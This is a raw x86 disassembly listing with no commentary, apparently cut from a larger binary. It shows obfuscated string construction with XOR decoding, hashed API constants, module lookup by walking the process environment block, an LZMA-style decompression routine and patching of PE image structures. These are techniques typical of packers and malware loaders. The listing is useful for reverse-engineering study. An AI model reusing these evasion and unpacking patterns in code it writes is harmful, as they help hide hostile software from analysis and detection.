  412189:	mov    edi,0x4e3d
  41218e:	mov    eax,0x4f8e
  412193:	mov    WORD PTR [ebp-0x78],ax
  412197:	mov    eax,edi
  412199:	mov    WORD PTR [ebp-0x76],ax
  41219d:	add    eax,0x41
  4121a0:	mov    WORD PTR [ebp-0x74],ax
  4121a4:	lea    eax,[edi+0x1]
  4121a7:	mov    WORD PTR [ebp-0x72],ax
  4121ab:	mov    eax,0x4fad
  4121b0:	mov    WORD PTR [ebp-0x70],ax
  4121b4:	lea    eax,[edi-0xc]
  4121b7:	mov    WORD PTR [ebp-0x6e],ax
  4121bb:	add    eax,0x4b
  4121be:	mov    WORD PTR [ebp-0x6c],ax
  4121c2:	lea    eax,[edi-0xa]
  4121c5:	mov    WORD PTR [ebp-0x6a],ax
  4121c9:	mov    eax,edi
  4121cb:	mov    WORD PTR [ebp-0x68],ax
  4121cf:	add    eax,0xfffffff5
  4121d2:	mov    WORD PTR [ebp-0x66],ax
  4121d6:	mov    eax,0x99fe
  4121db:	mov    WORD PTR [ebp-0x64],ax
  4121df:	mov    eax,0x8281
  4121e4:	mov    WORD PTR [ebp-0x62],ax
  4121e8:	mov    eax,0xd78c
  4121ed:	mov    WORD PTR [ebp-0x60],ax
  4121f1:	add    eax,0x14
  4121f4:	mov    WORD PTR [ebp-0x5e],ax
  4121f8:	mov    eax,0x27a3
  4121fd:	mov    WORD PTR [ebp-0x5c],ax
  412201:	mov    eax,0x47a3
  412206:	mov    WORD PTR [ebp-0x5a],ax
  41220a:	lea    eax,[edi-0xd]
  41220d:	mov    WORD PTR [ebp-0x58],ax
  412211:	mov    DWORD PTR [ebp-0x10],0xf306020f
  412218:	mov    DWORD PTR [ebp-0xc],0x7a050a1d
  41221f:	lea    eax,[ebp-0x10]
  412222:	mov    bl,BYTE PTR [eax]
  412224:	xor    bl,dl
  412226:	sub    bl,0xb
  412229:	mov    BYTE PTR [eax],bl
  41222b:	inc    eax
  41222c:	dec    ecx
  41222d:	jne    0x412222
  41222f:	lea    eax,[ebp-0x10]
  412232:	mov    DWORD PTR [ebp-0xb8],eax
  412238:	lea    eax,[ebp-0xbc]
  41223e:	push   eax
  41223f:	mov    eax,DWORD PTR [ebp+0xc]
  412242:	mov    ebx,0x7510896
  412247:	xor    eax,ebx
  412249:	mov    esi,0x3272dd
  41224e:	add    eax,esi
  412250:	push   eax
  412251:	mov    eax,DWORD PTR [ebp-0x4]
  412254:	add    eax,0x66
  412257:	push   eax
  412258:	mov    eax,DWORD PTR [ebp-0x4]
  41225b:	mov    eax,DWORD PTR [eax+0x198]
  412261:	mov    DWORD PTR [ebp-0xbc],0x1
  41226b:	push   DWORD PTR [eax]
  41226d:	mov    eax,DWORD PTR [ebp+0x10]
  412270:	call   eax
  412272:	mov    ecx,DWORD PTR [ebp+0x8]
  412275:	xor    ecx,ebx
  412277:	add    ecx,esi
  412279:	mov    DWORD PTR [ebp-0x8],eax
  41227c:	cmp    eax,ecx
  41227e:	jne    0x412299
  412280:	mov    eax,ds:0x33730bec
  412285:	or     eax,0x22150bef
  41228a:	mov    ds:0x33730bec,eax
  41228f:	add    eax,0x3372e90f
  412294:	mov    ds:0x33730bec,eax
  412299:	mov    ecx,0x4f85
  41229e:	mov    eax,ecx
  4122a0:	mov    WORD PTR [ebp-0x40],ax
  4122a4:	add    eax,0x3
  4122a7:	mov    edx,eax
  4122a9:	mov    WORD PTR [ebp-0x3e],dx
  4122ad:	lea    edx,[ecx+0xb]
  4122b0:	mov    WORD PTR [ebp-0x3c],dx
  4122b4:	add    edx,0x18
  4122b7:	mov    WORD PTR [ebp-0x3a],dx
  4122bb:	lea    edx,[ecx+0x25]
  4122be:	mov    WORD PTR [ebp-0x38],dx
  4122c2:	add    edx,0x5
  4122c5:	mov    WORD PTR [ebp-0x36],dx
  4122c9:	lea    edx,[ecx+0x1f]
  4122cc:	mov    WORD PTR [ebp-0x34],dx
  4122d0:	mov    WORD PTR [ebp-0x32],cx
  4122d4:	mov    ecx,edi
  4122d6:	mov    WORD PTR [ebp-0x30],cx
  4122da:	lea    ecx,[edx+0x1]
  4122dd:	mov    edx,ecx
  4122df:	mov    WORD PTR [ebp-0x54],dx
  4122e3:	mov    edx,eax
  4122e5:	mov    WORD PTR [ebp-0x52],dx
  4122e9:	mov    edx,0x4e70
  4122ee:	mov    WORD PTR [ebp-0x50],dx
  4122f2:	mov    WORD PTR [ebp-0x4e],ax
  4122f6:	lea    eax,[ecx-0x1b]
  4122f9:	mov    WORD PTR [ebp-0x4c],ax
  4122fd:	add    eax,0x5
  412300:	mov    WORD PTR [ebp-0x4a],ax
  412304:	lea    eax,[ecx-0x21]
  412307:	mov    WORD PTR [ebp-0x48],ax
  41230b:	mov    WORD PTR [ebp-0x46],cx
  41230f:	mov    WORD PTR [ebp-0x44],di
  412313:	mov    eax,DWORD PTR [ebp+0x8]
  412316:	movzx  ecx,WORD PTR [ebp-0x54]
  41231a:	xor    eax,ebx
  41231c:	add    eax,esi
  41231e:	xor    eax,ecx
  412320:	mov    WORD PTR [ebp-0x54],ax
  412324:	mov    eax,DWORD PTR [ebp+0x8]
  412327:	movzx  ecx,WORD PTR [ebp-0x40]
  41232b:	xor    eax,ebx
  41232d:	add    eax,esi
  41232f:	xor    eax,ecx
  412331:	mov    WORD PTR [ebp-0x40],ax
  412335:	xor    eax,eax
  412337:	mov    WORD PTR [ebp-0xd0],ax
  41233e:	mov    WORD PTR [ebp-0xe4],ax
  412345:	mov    edi,DWORD PTR [ebp+0x24]
  412348:	lea    eax,[ebp-0xd0]
  41234e:	lea    edx,[ebp-0x54]
  412351:	mov    DWORD PTR [ebp-0xbc],0x2
  41235b:	mov    DWORD PTR [ebp-0xb8],eax
  412361:	call   0x414b33
  412366:	mov    DWORD PTR [ebp-0xb4],eax
  41236c:	lea    eax,[ebp-0xbc]
  412372:	push   eax
  412373:	mov    eax,DWORD PTR [ebp+0xc]
  412376:	xor    eax,ebx
  412378:	add    eax,esi
  41237a:	push   eax
  41237b:	lea    eax,[ebp-0x78]
  41237e:	push   eax
  41237f:	push   DWORD PTR [ebp-0x8]
  412382:	mov    eax,DWORD PTR [ebp+0x10]
  412385:	call   eax
  412387:	mov    edi,DWORD PTR [ebp+0x24]
  41238a:	lea    eax,[ebp-0xe4]
  412390:	lea    edx,[ebp-0x40]
  412393:	mov    DWORD PTR [ebp-0xb8],eax
  412399:	call   0x414b33
  41239e:	mov    DWORD PTR [ebp-0xb4],eax
  4123a4:	lea    eax,[ebp-0xbc]
  4123aa:	push   eax
  4123ab:	mov    eax,DWORD PTR [ebp+0xc]
  4123ae:	xor    eax,ebx
  4123b0:	add    eax,esi
  4123b2:	push   eax
  4123b3:	lea    eax,[ebp-0x78]
  4123b6:	push   eax
  4123b7:	push   DWORD PTR [ebp-0x8]
  4123ba:	mov    eax,DWORD PTR [ebp+0x10]
  4123bd:	call   eax
  4123bf:	mov    eax,DWORD PTR [ebp+0x14]
  4123c2:	push   DWORD PTR [ebp-0x4]
  4123c5:	push   DWORD PTR [ebp+0x20]
  4123c8:	push   DWORD PTR [ebp+0x1c]
  4123cb:	push   DWORD PTR [ebp+0x18]
  4123ce:	push   DWORD PTR [ebp+0x10]
  4123d1:	push   DWORD PTR [ebp+0x8]
  4123d4:	push   DWORD PTR [ebp+0xc]
  4123d7:	call   0x4133d7
  4123dc:	add    DWORD PTR [ebp-0x4],eax
  4123df:	mov    eax,DWORD PTR [ebp-0x4]
  4123e2:	mov    eax,DWORD PTR [ebp-0x4]
  4123e5:	mov    edi,DWORD PTR [eax+0x190]
  4123eb:	mov    eax,DWORD PTR [ebp-0x4]
  4123ee:	mov    eax,DWORD PTR [eax+0x18c]
  4123f4:	mov    esi,DWORD PTR [eax]
  4123f6:	lea    ecx,[ebp+0x4]
  4123f9:	mov    edx,DWORD PTR [ecx]
  4123fb:	cmp    edx,esi
  4123fd:	jb     0x412414
  4123ff:	mov    eax,DWORD PTR [edi]
  412401:	mov    edi,DWORD PTR [eax+0x3c]
  412404:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  412408:	add    edi,esi
  41240a:	cmp    edx,edi
  41240c:	jae    0x412414
  41240e:	sub    eax,esi
  412410:	add    eax,edx
  412412:	mov    DWORD PTR [ecx],eax
  412414:	pop    edi
  412415:	pop    esi
  412416:	pop    ebx
  412417:	leave  
  412418:	ret    0x20
  41241b:	push   edi
  41241c:	push   esi
  41241d:	push   ebx
  41241e:	push   ebp
  41241f:	mov    ebp,esp
  412421:	mov    eax,DWORD PTR [ebp+0x24]
  412424:	add    DWORD PTR [ebp+0x28],eax
  412427:	push   eax
  412428:	cld    
  412429:	mov    esi,DWORD PTR [ebp+0x18]
  41242c:	add    DWORD PTR [ebp+0x1c],esi
  41242f:	push   esi
  412430:	mov    esi,DWORD PTR [ebp+0x14]
  412433:	lods   eax,DWORD PTR ds:[esi]
  412434:	xchg   edx,eax
  412435:	push   edx
  412436:	mov    cl,BYTE PTR [esi-0x2]
  412439:	or     eax,0xffffffff
  41243c:	shl    eax,cl
  41243e:	not    eax
  412440:	push   eax
  412441:	mov    cl,dh
  412443:	or     eax,0xffffffff
  412446:	shl    eax,cl
  412448:	not    eax
  41244a:	push   eax
  41244b:	add    cl,dl
  41244d:	mov    edi,esi
  41244f:	sub    esp,0xc
  412452:	sub    eax,eax
  412454:	inc    eax
  412455:	push   eax
  412456:	push   eax
  412457:	push   eax
  412458:	push   eax
  412459:	push   eax
  41245a:	push   edi
  41245b:	sub    esi,esi
  41245d:	push   esi
  41245e:	or     ebx,0xffffffff
  412461:	mov    eax,0x300
  412466:	shl    eax,cl
  412468:	lea    ecx,[eax+0x736]
  41246e:	mov    eax,0x4000400
  412473:	shr    ecx,1
  412475:	rep stos DWORD PTR es:[edi],eax
  412477:	push   0x5
  412479:	pop    ecx
  41247a:	call   0x412765
  41247f:	loop   0x41247a
  412481:	lea    esi,[esi]
  412483:	lea    edi,[edi]
  412485:	mov    edi,DWORD PTR [ebp-0x4]
  412488:	mov    eax,DWORD PTR [ebp-0x10]
  41248b:	sub    edi,DWORD PTR [ebp+0x24]
  41248e:	and    eax,edi
  412490:	mov    DWORD PTR [ebp-0x18],eax
  412493:	mov    al,0x0
  412495:	call   0x41277d
  41249a:	jne    0x412535
  4124a0:	mov    cl,BYTE PTR [ebp-0xc]
  4124a3:	and    edi,DWORD PTR [ebp-0x14]
  4124a6:	shl    edi,cl
  4124a8:	sub    cl,0x8
  4124ab:	neg    cl
  4124ad:	shr    esi,cl
  4124af:	pop    eax
  4124b0:	add    edi,esi
  4124b2:	pop    esi
  4124b3:	lea    edi,[edi+edi*2]
  4124b6:	shl    edi,0x8
  4124b9:	cmp    al,0x7
  4124bb:	pop    edx
  4124bc:	lea    ecx,[esi+edi*2+0xe6c]
  4124c3:	push   ecx
  4124c4:	push   esi
  4124c5:	mov    esi,0x100
  4124ca:	push   eax
  4124cb:	mov    al,0x1
  4124cd:	jb     0x412503
  4124cf:	mov    edi,DWORD PTR [ebp-0x4]
  4124d2:	sub    edi,DWORD PTR [ebp-0x24]
  4124d5:	movzx  edi,BYTE PTR [edi]
  4124d8:	mov    ebp,DWORD PTR [ebp-0x34]
  4124db:	shl    edi,1
  4124dd:	mov    ecx,esi
  4124df:	and    esi,edi
  4124e1:	add    ecx,esi
  4124e3:	lea    ebp,[ebp+ecx*2+0x0]
  4124e7:	call   0x41279c
  4124ec:	mov    ecx,eax
  4124ee:	shr    esi,0x8
  4124f1:	and    ecx,0x1
  4124f4:	cmp    esi,ecx
  4124f6:	mov    esi,0x100
  4124fb:	jne    0x41250b
  4124fd:	cmp    eax,esi
  4124ff:	jb     0x4124d8
  412501:	jmp    0x412517
  412503:	mov    ebp,DWORD PTR [ebp-0x34]
  412506:	call   0x41279c
  41250b:	inc    eax
  41250c:	inc    esi
  41250d:	sub    eax,0x1
  412510:	sub    esi,0x1
  412513:	cmp    eax,esi
  412515:	jb     0x412503
  412517:	pop    edx
  412518:	inc    edx
  412519:	cmp    edx,0x5
  41251c:	dec    edx
  41251d:	mov    ecx,edx
  41251f:	jb     0x412530
  412521:	inc    edx
  412522:	cmp    edx,0xb
  412525:	dec    edx
  412526:	mov    cl,0x4
  412528:	dec    cl
  41252a:	jb     0x412530
  41252c:	mov    cl,0x7
  41252e:	dec    cl
  412530:	sub    edx,ecx
  412532:	push   edx
  412533:	jmp    0x412584
  412535:	mov    al,0xc1
  412537:	dec    al
  412539:	call   0x41278d
  41253e:	jne    0x412554
  412540:	pop    eax
  412541:	pop    edi
  412542:	pop    edx
  412543:	pop    ecx
  412544:	pop    edx
  412545:	pop    ecx
  412546:	push   DWORD PTR [esp]
  412549:	push   ecx
  41254a:	push   edx
  41254b:	mov    edx,0x664
  412550:	mov    cl,0x0
  412552:	jmp    0x4125c7
  412554:	mov    al,0xcd
  412556:	dec    al
  412558:	call   0x41278d
  41255d:	jne    0x41258d
  41255f:	mov    al,0xf1
  412561:	dec    al
  412563:	call   0x41277d
  412568:	jne    0x4125bd
  41256a:	pop    eax
  41256b:	cmp    al,0x7
  41256d:	mov    al,0x9
  41256f:	jb     0x412573
  412571:	mov    al,0xb
  412573:	push   eax
  412574:	mov    esi,DWORD PTR [ebp-0x4]
  412577:	sub    esi,DWORD PTR [ebp-0x24]
  41257a:	cmp    esi,DWORD PTR [ebp+0x24]
  41257d:	jb     0x412754
  412583:	lods   al,BYTE PTR ds:[esi]
  412584:	mov    edi,DWORD PTR [ebp-0x4]
  412587:	stos   BYTE PTR es:[edi],al
  412588:	jmp    0x41271b
  41258d:	mov    al,0xd8
  41258f:	call   0x41278d
  412594:	mov    esi,DWORD PTR [ebp-0x28]
  412597:	je     0x4125b4
  412599:	mov    al,0xe4
  41259b:	call   0x41278d
  4125a0:	mov    esi,DWORD PTR [ebp-0x2c]
  4125a3:	je     0x4125ae
  4125a5:	mov    esi,DWORD PTR [ebp-0x30]
  4125a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4125ab:	mov    DWORD PTR [ebp-0x30],ecx
  4125ae:	mov    ecx,DWORD PTR [ebp-0x28]
  4125b1:	mov    DWORD PTR [ebp-0x2c],ecx
  4125b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4125b7:	mov    DWORD PTR [ebp-0x28],ecx
  4125ba:	mov    DWORD PTR [ebp-0x24],esi
  4125bd:	pop    eax
  4125be:	pop    edi
  4125bf:	pop    ecx
  4125c0:	mov    edx,0xa68
  4125c5:	mov    cl,0x8
  4125c7:	add    edx,edi
  4125c9:	push   edx
  4125ca:	push   edi
  4125cb:	cmp    al,0x7
  4125cd:	mov    al,cl
  4125cf:	jb     0x4125d3
  4125d1:	add    al,0x3
  4125d3:	push   eax
  4125d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4125d7:	call   0x41279a
  4125dc:	jne    0x4125f2
  4125de:	mov    eax,DWORD PTR [ebp-0x18]
  4125e1:	mov    edi,DWORD PTR [ebp-0x34]
  4125e4:	shl    eax,0x3
  4125e7:	sub    ecx,ecx
  4125e9:	push   0x8
  4125eb:	pop    esi
  4125ec:	lea    edi,[edi+eax*2+0x4]
  4125f0:	jmp    0x412627
  4125f2:	mov    ebp,DWORD PTR [ebp-0x34]
  4125f5:	add    ebp,0x2
  4125f8:	call   0x41279a
  4125fd:	jne    0x412617
  4125ff:	mov    eax,DWORD PTR [ebp-0x18]
  412602:	mov    edi,DWORD PTR [ebp-0x34]
  412605:	shl    eax,0x3
  412608:	push   0x8
  41260a:	pop    ecx
  41260b:	push   0x8
  41260d:	pop    esi
  41260e:	lea    edi,[edi+eax*2+0x104]
  412615:	jmp    0x412627
  412617:	mov    edi,0x204
  41261c:	add    edi,DWORD PTR [ebp-0x34]
  41261f:	push   0x10
  412621:	pop    ecx
  412622:	mov    esi,0x100
  412627:	mov    DWORD PTR [ebp-0x1c],ecx
  41262a:	sub    eax,eax
  41262c:	inc    eax
  41262d:	mov    ebp,edi
  41262f:	call   0x41279c
  412634:	mov    ecx,eax
  412636:	sub    ecx,esi
  412638:	jb     0x41262d
  41263a:	add    DWORD PTR [ebp-0x1c],ecx
  41263d:	cmp    DWORD PTR [ebp-0x3c],0x4
  412641:	jae    0x4126f7
  412647:	add    DWORD PTR [ebp-0x3c],0x7
  41264b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41264e:	cmp    ecx,0x4
  412651:	jb     0x412656
  412653:	push   0x3
  412655:	pop    ecx
  412656:	mov    edi,DWORD PTR [ebp-0x38]
  412659:	shl    ecx,0x6
  41265c:	sub    eax,eax
  41265e:	inc    eax
  41265f:	push   0x40
  412661:	pop    esi
  412662:	lea    edi,[edi+ecx*2+0x360]
  412669:	mov    ebp,edi
  41266b:	call   0x41279c
  412670:	mov    ecx,eax
  412672:	sub    ecx,esi
  412674:	jb     0x412669
  412676:	mov    DWORD PTR [ebp-0x18],ecx
  412679:	mov    DWORD PTR [ebp-0x24],ecx
  41267c:	cmp    ecx,0x4
  41267f:	jb     0x4126f4
  412681:	mov    esi,ecx
  412683:	and    DWORD PTR [ebp-0x24],0x1
  412687:	shr    esi,1
  412689:	or     DWORD PTR [ebp-0x24],0x2
  41268d:	dec    esi
  41268e:	cmp    ecx,0xe
  412691:	jae    0x4126ac
  412693:	mov    eax,0x2af
  412698:	sub    eax,ecx
  41269a:	mov    ecx,esi
  41269c:	shl    BYTE PTR [ebp-0x24],cl
  41269f:	add    eax,DWORD PTR [ebp-0x24]
  4126a2:	shl    eax,1
  4126a4:	add    eax,DWORD PTR [ebp-0x38]
  4126a7:	mov    DWORD PTR [ebp-0x34],eax
  4126aa:	jmp    0x4126d9
  4126ac:	sub    esi,0x4
  4126af:	call   0x412759
  4126b4:	shr    ebx,1
  4126b6:	shl    DWORD PTR [ebp-0x24],1
  4126b9:	cmp    DWORD PTR [ebp-0x20],ebx
  4126bc:	jb     0x4126c4
  4126be:	inc    DWORD PTR [ebp-0x24]
  4126c1:	sub    DWORD PTR [ebp-0x20],ebx
  4126c4:	dec    esi
  4126c5:	jne    0x4126af
  4126c7:	mov    eax,0x644
  4126cc:	add    eax,DWORD PTR [ebp-0x38]
  4126cf:	mov    DWORD PTR [ebp-0x34],eax
  4126d2:	shl    DWORD PTR [ebp-0x24],0x4
  4126d6:	push   0x4
  4126d8:	pop    esi
  4126d9:	sub    edi,edi
  4126db:	inc    edi
  4126dc:	mov    eax,edi
  4126de:	mov    ebp,DWORD PTR [ebp-0x34]
  4126e1:	call   0x41279c
  4126e6:	test   al,0x1
  4126e8:	je     0x4126ed
  4126ea:	or     DWORD PTR [ebp-0x24],edi
  4126ed:	shl    edi,1
  4126ef:	dec    esi
  4126f0:	jne    0x4126de
  4126f2:	jmp    0x4126f4
  4126f4:	inc    DWORD PTR [ebp-0x24]
  4126f7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4126fa:	add    ecx,0x2
  4126fd:	mov    edi,DWORD PTR [ebp-0x4]
  412700:	mov    eax,edi
  412702:	sub    eax,DWORD PTR [ebp+0x24]
  412705:	cmp    DWORD PTR [ebp-0x24],eax
  412708:	ja     0x412754
  41270a:	mov    esi,edi
  41270c:	sub    esi,DWORD PTR [ebp-0x24]
  41270f:	mov    edx,DWORD PTR [ebp+0x28]
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	stos   BYTE PTR es:[edi],al
  412714:	cmp    edi,edx
  412716:	jae    0x41271b
  412718:	dec    ecx
  412719:	jne    0x412712
  41271b:	mov    DWORD PTR [ebp-0x4],edi
  41271e:	movzx  esi,al
  412721:	cmp    edi,DWORD PTR [ebp+0x28]
  412724:	jb     0x412485
  41272a:	call   0x412759
  41272f:	sub    eax,eax
  412731:	lea    ebp,[esp+0x3c]
  412735:	mov    edx,DWORD PTR [ebp+0x20]
  412738:	mov    esi,DWORD PTR [ebp-0x8]
  41273b:	sub    esi,DWORD PTR [ebp+0x18]
  41273e:	mov    DWORD PTR [edx],esi
  412740:	mov    edx,DWORD PTR [ebp+0x2c]
  412743:	mov    edi,DWORD PTR [ebp-0x4]
  412746:	sub    edi,DWORD PTR [ebp+0x24]
  412749:	mov    DWORD PTR [edx],edi
  41274b:	leave  
  41274c:	pop    ebx
  41274d:	pop    esi
  41274e:	pop    edi
  41274f:	ret    0x1c
  412752:	pop    esi
  412753:	pop    eax
  412754:	sub    eax,eax
  412756:	inc    eax
  412757:	jmp    0x412731
  412759:	cmp    ebx,0x1000000
  41275f:	jb     0x412762
  412761:	ret    
  412762:	shl    ebx,0x8
  412765:	push   esi
  412766:	mov    esi,DWORD PTR [ebp-0x8]
  412769:	cmp    esi,DWORD PTR [ebp+0x1c]
  41276c:	jae    0x412752
  41276e:	mov    eax,DWORD PTR [ebp-0x20]
  412771:	shl    eax,0x8
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	mov    DWORD PTR [ebp-0x20],eax
  412778:	mov    DWORD PTR [ebp-0x8],esi
  41277b:	pop    esi
  41277c:	ret    
  41277d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412780:	movzx  eax,al
  412783:	shl    ecx,0x4
  412786:	add    eax,DWORD PTR [ebp-0x18]
  412789:	add    eax,ecx
  41278b:	jmp    0x412793
  41278d:	movzx  eax,al
  412790:	add    eax,DWORD PTR [ebp-0x3c]
  412793:	mov    ebp,DWORD PTR [ebp-0x38]
  412796:	lea    ebp,[ebp+eax*2+0x0]
  41279a:	sub    eax,eax
  41279c:	lea    ebp,[ebp+eax*2+0x0]
  4127a0:	cmp    ebx,0x1000000
  4127a6:	jae    0x4127c4
  4127a8:	mov    ecx,DWORD PTR [esp+0x38]
  4127ac:	shl    DWORD PTR [esp+0x20],0x8
  4127b1:	cmp    ecx,DWORD PTR [esp+0x5c]
  4127b5:	jae    0x412753
  4127b7:	mov    dl,BYTE PTR [ecx]
  4127b9:	inc    DWORD PTR [esp+0x38]
  4127bd:	shl    ebx,0x8
  4127c0:	mov    BYTE PTR [esp+0x20],dl
  4127c4:	mov    ecx,ebx
  4127c6:	movzx  edx,WORD PTR [ebp+0x0]
  4127ca:	shr    ecx,0xb
  4127cd:	imul   ecx,edx
  4127d0:	cmp    DWORD PTR [esp+0x20],ecx
  4127d4:	jae    0x4127ed
  4127d6:	mov    ebx,ecx
  4127d8:	mov    ecx,0x800
  4127dd:	sub    ecx,edx
  4127df:	shr    ecx,0x5
  4127e2:	add    WORD PTR [ebp+0x0],cx
  4127e6:	add    eax,eax
  4127e8:	lea    ebp,[esp+0x40]
  4127ec:	ret    
  4127ed:	shr    edx,0x5
  4127f0:	sub    DWORD PTR [esp+0x20],ecx
  4127f4:	sub    ebx,ecx
  4127f6:	sub    WORD PTR [ebp+0x0],dx
  4127fa:	add    eax,eax
  4127fc:	add    eax,0x1
  4127ff:	lea    ebp,[esp+0x40]
  412803:	ret    
  412804:	push   ebp
  412805:	mov    ebp,esp
  412807:	sub    esp,0xec
  41280d:	push   ebx
  41280e:	push   esi
  41280f:	push   edi
  412810:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  412817:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  41281e:	mov    eax,DWORD PTR [ebp+0x8]
  412821:	mov    DWORD PTR [ebp+0x8],eax
  412824:	mov    ecx,DWORD PTR [ebp-0x8]
  412827:	mov    ebx,0x7510896
  41282c:	xor    ecx,ebx
  41282e:	mov    eax,0x3272dd
  412833:	add    ecx,eax
  412835:	mov    DWORD PTR [ebp-0x20],ecx
  412838:	mov    ecx,DWORD PTR [ebp-0x8]
  41283b:	xor    ecx,ebx
  41283d:	add    ecx,eax
  41283f:	mov    DWORD PTR [ebp-0x30],ecx
  412842:	mov    ecx,DWORD PTR [ebp-0x8]
  412845:	xor    ecx,ebx
  412847:	add    ecx,eax
  412849:	mov    DWORD PTR [ebp-0x2c],ecx
  41284c:	mov    ecx,DWORD PTR [ebp-0x8]
  41284f:	xor    ecx,ebx
  412851:	add    ecx,eax
  412853:	mov    DWORD PTR [ebp-0xa0],ecx
  412859:	mov    DWORD PTR [ebp-0x48],0xf89f05b5
  412860:	mov    DWORD PTR [ebp-0x2c],0xf89cb5b5
  412867:	mov    DWORD PTR [ebp-0x3c],0xf89c85b1
  41286e:	push   0x24
  412870:	pop    ecx
  412871:	mov    DWORD PTR [ebp-0x28],ecx
  412874:	mov    DWORD PTR [ebp-0x28],ecx
  412877:	push   0x64
  412879:	pop    ecx
  41287a:	mov    DWORD PTR [ebp-0x28],ecx
  41287d:	mov    DWORD PTR [ebp-0x28],ecx
  412880:	mov    DWORD PTR [ebp-0x28],0x4c
  412887:	mov    DWORD PTR [ebp-0x28],0x42
  41288e:	mov    ecx,DWORD PTR [ebp-0x8]
  412891:	xor    ecx,ebx
  412893:	add    ecx,eax
  412895:	mov    DWORD PTR [ebp-0x28],ecx
  412898:	mov    ecx,DWORD PTR [ebp-0x8]
  41289b:	xor    ecx,ebx
  41289d:	add    ecx,eax
  41289f:	mov    DWORD PTR [ebp-0x28],ecx
  4128a2:	mov    DWORD PTR [ebp-0x24],0x256
  4128a9:	mov    DWORD PTR [ebp-0x1c],0x34
  4128b0:	mov    DWORD PTR [ebp-0xc],0x78
  4128b7:	lea    edi,[ebp-0xcc]
  4128bd:	lea    esi,[ebp-0xec]
  4128c3:	call   0x413346
  4128c8:	dec    DWORD PTR [ebp-0xc]
  4128cb:	jne    0x4128b7
  4128cd:	dec    DWORD PTR [ebp-0x1c]
  4128d0:	jne    0x4128b0
  4128d2:	dec    DWORD PTR [ebp-0x24]
  4128d5:	jne    0x4128a9
  4128d7:	mov    DWORD PTR [ebp-0x1c],0x400c
  4128de:	mov    eax,DWORD PTR [ebp-0x8]
  4128e1:	xor    eax,ebx
  4128e3:	mov    esi,0x3272dd
  4128e8:	add    eax,esi
  4128ea:	mov    DWORD PTR [ebp-0x14],eax
  4128ed:	mov    eax,DWORD PTR [ebp-0x8]
  4128f0:	and    DWORD PTR [ebp-0x8c],0x0
  4128f7:	xor    eax,ebx
  4128f9:	add    eax,esi
  4128fb:	mov    DWORD PTR [ebp-0x24],eax
  4128fe:	mov    eax,fs:0x18
  412904:	mov    DWORD PTR [ebp-0x8c],eax
  41290a:	mov    eax,DWORD PTR [eax+0x30]
  41290d:	mov    DWORD PTR [ebp-0x90],eax
  412913:	mov    eax,DWORD PTR [eax+0xc]
  412916:	mov    DWORD PTR [ebp-0x9c],eax
  41291c:	mov    eax,DWORD PTR [ebp+0x8]
  41291f:	lea    ecx,[ebp-0x8c]
  412925:	mov    DWORD PTR [eax+0x1a0],ecx
  41292b:	mov    eax,DWORD PTR [ebp+0x8]
  41292e:	lea    ecx,[ebp-0x90]
  412934:	mov    DWORD PTR [eax+0x1a4],ecx
  41293a:	mov    eax,DWORD PTR [ebp+0x8]
  41293d:	push   DWORD PTR [ebp+0x8]
  412940:	lea    ecx,[ebp-0x9c]
  412946:	mov    DWORD PTR [eax+0x1a8],ecx
  41294c:	call   0x414b04
  412951:	mov    ecx,DWORD PTR [ebp-0x8]
  412954:	xor    ecx,ebx
  412956:	add    ecx,esi
  412958:	cmp    ecx,eax
  41295a:	je     0x412c2e
  412960:	mov    eax,DWORD PTR [ebp+0x8]
  412963:	mov    eax,DWORD PTR [eax+0x194]
  412969:	mov    ecx,DWORD PTR [eax]
  41296b:	mov    eax,DWORD PTR [ebp+0x8]
  41296e:	mov    eax,DWORD PTR [eax+0x194]
  412974:	mov    eax,DWORD PTR [eax]
  412976:	add    eax,DWORD PTR [ecx+0x3c]
  412979:	mov    ecx,DWORD PTR [ebp+0x8]
  41297c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  412982:	lea    edx,[ebp-0xac]
  412988:	push   edx
  412989:	mov    edx,DWORD PTR [ebp+0x8]
  41298c:	mov    edx,DWORD PTR [edx+0x18c]
  412992:	mov    edx,DWORD PTR [edx]
  412994:	add    edx,DWORD PTR [eax+0x88]
  41299a:	push   0x4
  41299c:	push   DWORD PTR [eax+0x8c]
  4129a2:	push   edx
  4129a3:	call   DWORD PTR [ecx+0x1c]
  4129a6:	push   DWORD PTR [ebp+0x8]
  4129a9:	mov    edi,DWORD PTR [ebp+0x8]
  4129ac:	mov    eax,DWORD PTR [ebp+0x8]
  4129af:	mov    edx,DWORD PTR [eax+0x1b8]
  4129b5:	mov    DWORD PTR [ebp-0x5c],0xc0e0f06
  4129bc:	mov    DWORD PTR [ebp-0x58],0x50a091f
  4129c3:	mov    WORD PTR [ebp-0x54],0x7a3d
  4129c9:	mov    DWORD PTR [ebp-0x70],0x23f0f25
  4129d0:	mov    DWORD PTR [ebp-0x6c],0x63d0c1d
  4129d7:	mov    DWORD PTR [ebp-0x68],0x281d020a
  4129de:	mov    DWORD PTR [ebp-0x64],0xc0109f1
  4129e5:	mov    DWORD PTR [ebp-0x60],0x7a3d1f05
  4129ec:	mov    DWORD PTR [ebp-0x84],0x23f0f25
  4129f6:	mov    DWORD PTR [ebp-0x80],0x63d0c1d
  4129fd:	mov    DWORD PTR [ebp-0x7c],0x281d020a
  412a04:	mov    DWORD PTR [ebp-0x78],0xc0109f1
  412a0b:	mov    DWORD PTR [ebp-0x74],0x7a131f05
  412a12:	call   0x414b33
  412a17:	push   eax
  412a18:	mov    eax,DWORD PTR [ebp+0x8]
  412a1b:	mov    eax,DWORD PTR [eax+0x1a8]
  412a21:	push   DWORD PTR [eax]
  412a23:	call   0x4147d5
  412a28:	test   eax,eax
  412a2a:	jne    0x412a7c
  412a2c:	mov    eax,DWORD PTR [ebp+0x8]
  412a2f:	mov    eax,DWORD PTR [eax+0x1d8]
  412a35:	mov    edi,DWORD PTR [ebp+0x8]
  412a38:	add    eax,0x4
  412a3b:	mov    DWORD PTR [ebp-0x18],eax
  412a3e:	mov    eax,DWORD PTR [ebp+0x8]
